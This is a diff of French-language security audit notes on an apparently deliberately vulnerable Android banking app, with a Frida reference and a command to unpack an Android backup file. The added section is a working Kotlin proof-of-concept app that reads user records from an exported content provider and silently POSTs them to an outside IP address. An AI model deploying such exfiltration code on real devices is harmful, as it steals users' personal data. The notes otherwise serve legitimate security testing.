@@ -264,7 +264,54 @@ Java.perform(function () {
 Puis il y a pas de controle de l'utilisateur:
 ![[Pasted image 20260319170545.png]]
 
-N importe qui peut donc créer un compte
+```
+package com.example.auditxmco  
+  
+import android.net.Uri  
+import android.os.Bundle  
+import androidx.activity.ComponentActivity  
+import java.net.HttpURLConnection  
+import java.net.URL  
+  
+class MainActivity : ComponentActivity() {  
+    override fun onCreate(savedInstanceState: Bundle?) {  
+        super.onCreate(savedInstanceState)  
+  
+        val uri = Uri.parse(  
+            "content://com.android.xmcodroidbank.TrackUserContentProvider/trackerusers"  
+        )  
+  
+        val cursor = contentResolver.query(uri, null, null, null, null)  
+        val data = StringBuilder()  
+  
+        cursor?.use {  
+            while (it.moveToNext()) {  
+                data.append(it.getString(1)).append("\n")  
+            }  
+        }  
+  
+        Thread {  
+            try {  
+                val conn = URL("http://212.129.9.19:5555")  
+                    .openConnection() as HttpURLConnection  
+  
+                conn.requestMethod = "POST"  
+                conn.doOutput = true  
+  
+                conn.outputStream.use { os ->  
+                    os.write(data.toString().toByteArray())  
+                }  
+  
+                conn.responseCode // trigger request  
+  
+            } catch (_: Exception) {}  
+        }.start()  
+  
+        finish()  
+    }  
+}
+```
+
 
 ```
 BroadcastReceiver Manipulation Fait
@@ -319,9 +366,6 @@ Manipulation de la chaine is_admin est évoqué dans la vuln ACL de l'API, faut 
 
 ```
 dd if=backup.ab bs=24 skip=1 | python3 -c "import sys, zlib; sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read()))" > backup.tar
-578+1 records in
-578+1 records out
-13887 bytes transferred in 0.000928 secs (14964440 bytes/sec)
 ```
 
 ```
